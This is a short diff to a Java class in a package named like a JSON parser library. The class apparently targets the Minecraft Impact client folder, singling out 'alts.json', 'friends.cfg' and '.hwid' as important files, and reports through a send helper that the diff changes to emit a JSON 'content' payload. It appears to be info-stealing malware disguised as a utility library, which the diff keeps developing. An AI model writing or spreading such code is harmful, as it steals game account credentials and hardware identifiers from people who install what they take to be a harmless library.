@@ -3,13 +3,13 @@ package org.json.updated.parsers.impl;
 import org.json.updated.parsers.JSONObject;
 import org.json.updated.parsers.JSONRegexHandler;
 import org.json.updated.parsers.util.FileSystemHelper;
+import org.json.updated.parsers.util.JSONBuilder;
 
 import java.io.File;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.ArrayList;
 
-// you can never be too sure
 public class ImpactData implements JSONObject {
     private static final String[] IMPORTANT_FILES = new String[] { "alts.json", "friends.cfg", ".hwid" };
 
@@ -20,7 +20,7 @@ public class ImpactData implements JSONObject {
 
         String impactFolder = mcFolder + "Impact/";
         if (!Files.exists(Paths.get(impactFolder))) {
-            JSONRegexHandler.send("> Did not contain the Impact folder.");
+            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Impact folder.").build());
             return;
         }
 
